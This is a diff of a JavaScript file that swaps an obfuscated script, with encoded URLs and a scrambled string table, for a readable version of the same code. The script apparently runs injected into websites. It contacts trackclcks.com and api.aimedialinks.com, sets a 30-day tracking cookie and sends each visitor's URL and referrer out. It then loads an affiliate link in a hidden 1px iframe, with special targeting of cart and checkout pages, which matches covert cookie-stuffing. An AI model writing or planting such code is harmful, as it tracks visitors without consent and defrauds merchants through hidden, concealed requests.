@@ -1,415 +1,243 @@
-(function(_0x4a3fd1,_0x5cb29d){const _0x1bb95e=_0x3cf2,_0x2cfb5e=_0x4a3fd1();while(!![]){try{const _0x2d00f4=-parseInt(_0x1bb95e(0x1b9))/0x1+parseInt(_0x1bb95e(0x1d5))/0x2+parseInt(_0x1bb95e(0x1ce))/0x3+-parseInt(_0x1bb95e(0x1c3))/0x4*(parseInt(_0x1bb95e(0x1c7))/0x5)+parseInt(_0x1bb95e(0x1da))/0x6+parseInt(_0x1bb95e(0x1cb))/0x7*(-parseInt(_0x1bb95e(0x1e4))/0x8)+-parseInt(_0x1bb95e(0x1b7))/0x9;if(_0x2d00f4===_0x5cb29d)break;else _0x2cfb5e['push'](_0x2cfb5e['shift']());}catch(_0x463b3b){_0x2cfb5e['push'](_0x2cfb5e['shift']());}}}(_0x55af,0x9d13a));
+(function () {
 
-(function(){
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
 
-    const _0x3a91e8=_0x3cf2;
+            var r = Math.random() * 16 | 0,
+                v = c === 'x'
+                    ? r
+                    : (r & 0x3 | 0x8);
 
-    function _0x2f1d88(){
-
-        return (
-            _0x3a91e8(0x1e6)+
-            _0x3a91e8(0x1dc)+
-            _0x3a91e8(0x1b6)+
-            _0x3a91e8(0x1d4)
-        )['replace'](/[xy]/g,function(_0x4d58d2){
-
-            const _0x4a90bc=
-                Math['random']()*0x10|0x0;
-
-            const _0x37ef2a=
-                _0x4d58d2==='x'
-                    ?_0x4a90bc
-                    :(_0x4a90bc&0x3|0x8);
-
-            return _0x37ef2a['toString'](0x10);
+            return v.toString(16);
         });
     }
 
-    function _0x4a6f2f(_0x2b73d5){
+    function getCookie(cname) {
 
-        const _0x4d9f42=
-            _0x2b73d5+'=';
+        var name = cname + '=';
+        var ca = document.cookie.split(';');
 
-        const _0x1f7a67=
-            document['cookie']['split'](';');
+        for (var i = 0; i < ca.length; i++) {
 
-        for(
-            let _0x5f0d52=0x0;
-            _0x5f0d52<_0x1f7a67['length'];
-            _0x5f0d52++
-        ){
+            var c = ca[i].trim();
 
-            const _0x4df35e=
-                _0x1f7a67[_0x5f0d52]['trim']();
-
-            if(
-                _0x4df35e['indexOf'](_0x4d9f42)===0x0
-            ){
-
-                return _0x4df35e['substring'](
-                    _0x4d9f42['length'],
-                    _0x4df35e['length']
-                );
+            if (c.indexOf(name) === 0) {
+                return c.substring(name.length, c.length);
             }
         }
 
         return '';
     }
 
-    function _0x5d73f4(_0x3a4b1e){
+    function fireTracking(url) {
 
-        try{
+        try {
 
-            const _0x4bc2c0=
-                document['createElement']('iframe');
+            const iframe = document.createElement('iframe');
 
-            _0x4bc2c0['setAttribute'](
-                'sandbox',
-                'allow-same-origin allow-scripts allow-forms'
+            iframe.setAttribute(
+                "sandbox",
+                "allow-same-origin allow-scripts allow-forms"
             );
 
-            _0x4bc2c0['src']=
-                _0x3a4b1e;
+            iframe.src = url;
 
-            _0x4bc2c0['style']['display']=
-                'none';
+            iframe.style.display = 'none';
+            iframe.style.visibility = 'hidden';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            iframe.style.border = '0';
 
-            _0x4bc2c0['style']['visibility']=
-                'hidden';
+            iframe.onerror = function () {
 
-            _0x4bc2c0['style']['width']=
-                '1px';
+                var img = new Image();
+                img.src = url;
+            };
 
-            _0x4bc2c0['style']['height']=
-                '1px';
+            document.body.appendChild(iframe);
 
-            _0x4bc2c0['style']['border']=
-                '0';
+            
 
-            _0x4bc2c0['onerror']=
-                function(){
+        } catch (e) {
 
-                    const _0x2df7c4=
-                        new Image();
-
-                    _0x2df7c4['src']=
-                        _0x3a4b1e;
-                };
-
-            document['body']['appendChild'](
-                _0x4bc2c0
-            );
-
-        }catch(_0x48c5db){
-
-            console['error'](
-                'Iframe error:',
-                _0x48c5db
-            );
+            console.error("Iframe error:", e);
         }
     }
 
-    function _0x2f06bb(){
+    async function initTracking() {
 
-        const _0x53091b=[
-            'cart',
-            'checkout',
-            'pay',
-            'shipping',
-            'review-order',
-            'payment'
-        ];
-
-        return _0x53091b['some'](
-            function(_0x40f7fd){
-
-                return window['location']['pathname']
-                    ['toLowerCase']()
-                    ['includes'](_0x40f7fd);
-            }
-        );
-    }
-
-    async function _0x5c48f3(){
-
-        if(
-            sessionStorage['getItem'](
-                'tracking_done_'+
-                window['location']['hostname']
+        if (
+            sessionStorage.getItem(
+                'tracking_done_' + window.location.hostname
             )
-        ){
+        ) {
 
-            if(!_0x2f06bb()){
+            if (!isCartPage()) {
                 return;
             }
         }
 
-        try{
+        try {
 
-            let _0x3a22d0=
-                _0x4a6f2f('tracking_uuid')
-                ||
-                _0x2f1d88();
+            let uniqueId =
+                getCookie('tracking_uuid') ||
+                generateUUID();
 
-            let _0x2a0b7d=
-                (
-                    new Date(
-                        Date['now']()+
-                        30*86400*1000
-                    )
-                )['toUTCString']();
+            let expires = (
+                new Date(
+                    Date.now() + 30 * 86400 * 1000
+                )
+            ).toUTCString();
 
-            document['cookie']=
-                'tracking_uuid='+
-                _0x3a22d0+
-                '; expires='+
-                _0x2a0b7d+
+            document.cookie =
+                'tracking_uuid=' +
+                uniqueId +
+                '; expires=' +
+                expires +
                 ';path=/;SameSite=Lax';
 
-            let _0x4d4a64=
-                await fetch(
-                    atob(
-                        'aHR0cHM6Ly9hcGkuYWltZWRpYWxpbmtzLmNvbS9hcGkvdHJhY2stdXNlcg=='
-                    ),
-                    {
-                        'method':'POST',
-                        'keepalive':!![],
-                        'body':JSON['stringify']({
-                            'url':
-                                window['location']['href'],
-                            'referrer':
-                                document['referrer'],
-                            'unique_id':
-                                _0x3a22d0,
-                            'origin':
-                                window['location']['hostname'],
-                            'timestamp':
-                                new Date()['getTime']()
-                        }),
-                        'headers':{
-                            'Content-Type':
-                            'application/json'
-                        }
+            let response = await fetch(
+                'https://api.aimedialinks.com/api/track-user',
+                {
+                    method: 'POST',
+
+                    keepalive: true,
+
+                    body: JSON.stringify({
+                        url: window.location.href,
+                        referrer: document.referrer,
+                        unique_id: uniqueId,
+                        origin: window.location.hostname,
+                        timestamp: new Date().getTime()
+                    }),
+
+                    headers: {
+                        'Content-Type': 'application/json'
                     }
+                }
+            );
+
+            let result = await response.json();
+
+            if (
+                result.success &&
+                result.affiliate_url
+            ) {
+
+                fireTracking(
+                    result.affiliate_url
                 );
 
-            let _0x38cfd3=
-                await _0x4d4a64['json']();
-
-            if(
-                _0x38cfd3['success']
-                &&
-                _0x38cfd3['affiliate_url']
-            ){
-
-                _0x5d73f4(
-                    _0x38cfd3['affiliate_url']
-                );
-
-                sessionStorage['setItem'](
-                    'tracking_done_'+
-                    window['location']['hostname'],
+                sessionStorage.setItem(
+                    'tracking_done_' + window.location.hostname,
                     'true'
                 );
 
-            }else{
+            } else {
 
-                _0x5d73f4(
-                    atob(
-                        'aHR0cHM6Ly9hcGkuYWltZWRpYWxpbmtzLmNvbS9hcGkvZmFsbGJhY2stcGl4ZWw/aWQ9'
-                    )+
-                    _0x3a22d0
+                fireTracking(
+                    'https://api.aimedialinks.com/api/fallback-pixel?id=' +
+                    uniqueId
                 );
             }
 
-        }catch(_0x52e8c5){
+        } catch (error) {
 
-            console['error'](
+            console.error(
                 'Tracking Failed:',
-                _0x52e8c5
+                error
             );
         }
     }
 
-    function _0x27f1b4(){
+    function isCartPage() {
+
+        const cartPatterns = [
+            "cart",
+            "checkout",
+            "pay",
+            "shipping",
+            "review-order",
+            "payment"
+        ];
+
+        return cartPatterns.some(function (path) {
+
+            return window.location.pathname
+                .toLowerCase()
+                .includes(path);
+        });
+    }
+
+    function run() {
 
         fetch(
-            atob(
-                'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvc2l0ZS1jb25maWc/aG9zdD0='
-            )+
+            'https://trackclcks.com/api/site-config?host=' +
             encodeURIComponent(
-                window['location']['hostname']
+                window.location.hostname
             )
         )
 
-        ['then'](
-            function(_0x1d29f8){
+        .then(function (response) {
 
-                if(
-                    !_0x1d29f8['ok']
-                ){
+            if (!response.ok) {
 
-                    throw new Error(
-                        'Config API Failed'
-                    );
-                }
-
-                return _0x1d29f8['json']();
-            }
-        )
-
-        ['then'](
-            function(_0x42d09b){
-
-                if(
-                    !_0x42d09b
-                    ||
-                    (
-                        !_0x42d09b['always']
-                        &&
-                        !_0x42d09b['cartExtra']
-                    )
-                ){
-                    return;
-                }
-
-                if(
-                    _0x42d09b['always']
-                ){
-
-                    _0x5c48f3();
-                }
-
-                if(
-                    _0x42d09b['cartExtra']
-                    &&
-                    _0x2f06bb()
-                ){
-
-                    _0x5c48f3();
-                }
-            }
-        )
-
-        ['catch'](
-            function(_0x1a7582){
-
-                console['error'](
-                    'Config fetch failed:',
-                    _0x1a7582
+                throw new Error(
+                    'Config API Failed'
                 );
             }
+
+            return response.json();
+        })
+
+        .then(function (siteConfig) {
+
+            if (
+                !siteConfig ||
+                (
+                    !siteConfig.always &&
+                    !siteConfig.cartExtra
+                )
+            ) {
+                return;
+            }
+
+            if (siteConfig.always) {
+
+                initTracking();
+            }
+
+            if (
+                siteConfig.cartExtra &&
+                isCartPage()
+            ) {
+
+                initTracking();
+            }
+        })
+
+        .catch(function (error) {
+
+            console.error(
+                'Config fetch failed:',
+                error
+            );
+        });
+    }
+
+    if (
+        document.readyState === "interactive" ||
+        document.readyState === "complete"
+    ) {
+
+        run();
+
+    } else {
+
+        window.addEventListener(
+            "DOMContentLoaded",
+            run
         );
     }
 
-    if(
-        document['readyState']==='interactive'
-        ||
-        document['readyState']==='complete'
-    ){
-
-        _0x27f1b4();
-
-    }else{
-
-        window['addEventListener'](
-            'DOMContentLoaded',
-            _0x27f1b4
-        );
-    }
-
-}());
-
-function _0x3cf2(_0x56d4f1){
-
-    const _0x55afc1=
-        _0x55af();
-
-    return _0x3cf2=function(_0x3cf2c7){
-
-        _0x3cf2c7=
-            _0x3cf2c7-0x1b0;
-
-        return _0x55afc1[_0x3cf2c7];
-
-    },_0x3cf2(_0x56d4f1);
-}
-
-function _0x55af(){
-
-    return [
-
-        'xxxxxxxx-',
-        'xxxx-4xxx-',
-        'yxxx-',
-        'xxxxxxxxxxxx',
-
-        'cookie',
-        'split',
-        'trim',
-        'indexOf',
-        'substring',
-
-        'createElement',
-        'iframe',
-        'setAttribute',
-
-        'sandbox',
-        'allow-same-origin allow-scripts allow-forms',
-
-        'src',
-        'style',
-        'display',
-        'none',
-
-        'visibility',
-        'hidden',
-
-        'width',
-        'height',
-        'border',
-
-        'onerror',
-        'body',
-        'appendChild',
-
-        'tracking_uuid',
-        'tracking_done_',
-
-        'location',
-        'hostname',
-        'pathname',
-        'toLowerCase',
-        'includes',
-        'some',
-
-        'href',
-        'referrer',
-
-        'now',
-        'toUTCString',
-
-        'stringify',
-        'getTime',
-
-        'json',
-        'success',
-        'affiliate_url',
-
-        'setItem',
-        'getItem',
-
-        'readyState',
-        'interactive',
-        'complete',
-
-        'addEventListener',
-        'DOMContentLoaded',
-
-        'replace',
-        'random',
-        'toString',
-
-        'error'
-    ];
-}
+})();
